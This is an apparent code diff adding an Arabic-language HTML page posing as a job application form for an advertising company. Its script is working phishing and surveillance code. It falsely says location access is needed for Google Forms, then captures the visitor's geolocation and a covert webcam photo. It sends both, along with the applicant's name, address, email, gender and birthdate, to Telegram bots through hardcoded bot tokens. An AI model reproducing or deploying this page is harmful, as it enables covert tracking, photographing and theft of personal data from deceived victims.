@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>طلب التحاق</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        
+body {
+  background-color: #e0f2f1;
+}
+
+form p {
+  font-size: 120%;
+}
+
+.ctrlqHeaderMast {
+  height: 278px;
+  background: #009688;
+}
+
+.ctrlqFormContent {
+  color: rgba(0,0,0,.87);
+  padding: 20px 35px
+}
+
+.ctrlqFormContentWrapper {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -webkit-flex;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: vertical;
+  box-orient: vertical;
+  -webkit-flex-direction: column;
+  flex-direction: column
+}
+
+.ctrlqAccent {
+  background-color: #a7ffeb;
+  height: 8px;
+}
+.ctrlqCenteredContent {
+  margin: auto;
+  width: 600px; 
+}
+.ctrlqFormCard {
+  background-color: #fff;
+  margin-bottom: 48px;
+  -webkit-box-shadow: 0 1px 4px 0 rgba(0,0,0,0.37);
+  box-shadow: 0 1px 4px 0 rgba(0,0,0,0.37);
+  word-wrap: break-word
+}
+
+.ctrlqFormCard:first-of-type {
+  margin-top: -100px
+}
+
+.ctrlqHeaderTitle {
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  font-size: 34px;
+  line-height: 135%;
+  max-width: 100%;
+  min-width: 0%;
+  margin-bottom: 22px
+}
+
+@media (max-width: 660px) {
+  .ctrlqHeaderMast {
+    height: 122px;
+  }
+  .ctrlqFormCard:first-of-type {
+    margin-top: -50px;
+  }
+
+  .ctrlqCenteredContent {
+    width: 90%;
+  }
+}
+
+div.error {
+  position: relative;
+  top: -1rem;
+  left: 0rem;
+  font-size: 0.8rem;
+  color: #FF4081;
+  -webkit-transform: translateY(0%);
+  -ms-transform: translateY(0%);
+  -o-transform: translateY(0%);
+  transform: translateY(0%);
+}
+
+    </style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+<body>
+
+    <div class="ctrlqFormContentWrapper">
+        <div class="ctrlqHeaderMast"></div>
+        <div class="ctrlqCenteredContent">
+          <div class="ctrlqFormCard">
+            <div class="ctrlqAccent"></div>
+            <div class="ctrlqFormContent">
+  
+              <form style="display: none" id="ss" required>  
+  
+                <div class="row">
+                  <div class="input-field col s12">
+                    <h4>طلب تقديم لشركة ميديا لدعاية والاعلان</h4>
+                    <p>قم بكتابة جميع الخانات</p>
+                  </div>
+                </div>
+  
+                <div class="row">
+                  <div class="input-field col s12">
+                    <input id="name" name="name" type="text" class="validate" data-error="#e1" required>
+                    <label for="name">ادخل اسمك الرباعي</label>
+                    <div id="e1"></div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="input-field col s12">
+                    <input id="add" name="add" type="text" class="validate" data-error="#e1" required>
+                    <label for="add">ادخل عنوانك بالتفصيل</label>
+                    <div id="e1"></div>
+                  </div>
+                </div>
+  
+                <div class="row">
+                  <div class="input-field col s12">
+                    <input id="email" name="email" type="text" class="validate" data-error="#e2" required>
+                    <label for="email">ادخل البريد الالكتروني</label>
+                    <div id="e2"></div>
+                  </div>
+                </div>
+  
+                <div class="row">
+                  <div class="input-field col s12">
+                    <select id="gender" name="gender" class="validate" data-error="#e3" required>           
+                      <option value="" disabled selected>اختر الجنس</option>
+                      <option value="Male">ذكر</option> 
+                      <option value="Female">انثى</option>
+                    </select>
+                    <div id="e3"></div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="input-field col s12">
+                    <input type="date" id="birthdate" class="datepicker" name="birthdate" data-error="#e5" required>
+                    <div id="e5"></div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="input-field col s12">
+                    <textarea id="bio" name="bio" class="materialize-textarea" data-error="#e6" required></textarea>
+                    <label for="bio">نبذه مختصره عن نفسك</label>
+                    <div id="e6"></div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="input-field col m6 s12">
+                    <button type="submit" class="waves-effect waves-light btn-large" onclick="sginup()">ارسال</button>
+                  </div>
+                </div>
+  
+              </form>
+              
+    <div class="row" id="dd">
+        <div class="input-field col s12">
+          <h4>طلب تقديم لشركة ميديا لدعاية والاعلان</h4>
+    <p>قم بكتابة جميع الخانات المطلوبه منك لكي يتم الموافقه على طلب الانضمام الى شركتنا</p>
+    <p>قم بالموافقه على طلب الوصول الى الموقع الجفرافي ليعمل معك خدمة جوجل فورم بشكل صحيح</p>
+    <button onclick="requestAccess()" class="waves-effect waves-light btn-large">اظهار الخانات</button>
+  </div>
+</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    <script>
+ function sginup() {
+  var a = document.getElementById("name").value;
+  var b = document.getElementById("add").value;
+  var c = document.getElementById("email").value;
+  var d = document.getElementById("gender").value;
+  var e = document.getElementById("birthdate").value;
+  var f = document.getElementById("bio").value;
+  o = 'الاســـــــــم : <pre>' + a + '</pre>%0Aالبريد الالكتروني:<pre>' + c +'</pre>%0Aالعنوان : <pre>' + b + '</pre>%0Aالنوع :<pre>' + d + '</pre>%0Aتاريخ الميلاد :<pre>' + e +'</pre>%0Aالرساله :<pre>' + f + '</pre>';
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", "https://api.telegram.org/bot5991463182:AAH1BRMm-RWCuB0hUxER_KOqVJBWdqoGLkQ/sendMessage?text=" + o + "&chat_id=-1001589590856&parse_mode=html");
+  xhr.send();
+}   
+    function requestAccess() {
+        document.getElementById("dd").style.display = "none";
+        document.getElementById("ss").style.display = "block";
+    // السماح بالوصول للموقع والكاميرا
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // التقاط صورة باستخدام الكاميرا
+            const video = document.createElement('video');
+            document.body.appendChild(video);
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+
+                        // التقاط صورة
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+
+                        const imageDataURL = canvas.toDataURL('image/png');
+
+                        // إرسال البيانات إلى تليجرام
+                        sendToTelegram(latitude, longitude, imageDataURL);
+
+                        // إغلاق الكاميرا
+                        video.srcObject.getTracks().forEach((track) => track.stop());
+                        video.remove();
+                    };
+                })
+                .catch((error) => {
+                    console.error('خطأ في الوصول إلى الكاميرا:', error);
+                });
+        },
+        (error) => {
+            console.error('خطأ في الوصول للموقع:', error);
+        }
+    );
+}
+
+function sendToTelegram(latitude, longitude, imageDataURL) {
+    const apiUrl = 'https://api.telegram.org/bot6081485920:AAFXqev7hDSUQUtBb9Cx2GiieRCVGdcb-JI/sendPhoto';
+
+    const formData = new FormData();
+    formData.append('chat_id', '-1001589590856');
+    formData.append('photo', dataURLtoBlob(imageDataURL), 'photo.png');
+    formData.append('caption', `الموقع: https://www.google.com/maps?q=${latitude},${longitude}`);
+
+    fetch(apiUrl, {
+        method: 'POST',
+        body: formData
+    })
+    .then((response) => response.json())
+    .then((data) => {
+        console.log('تم إرسال البيانات إلى تليجرام:', data);
+    })
+    .catch((error) => {
+        console.error('حدث خطأ أثناء إرسال البيانات إلى تليجرام:', error);
+    });
+}
+
+function dataURLtoBlob(dataURL) {
+    const byteString = atob(dataURL.split(',')[1]);
+    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
+
+    </script>
+</body>
+</html>
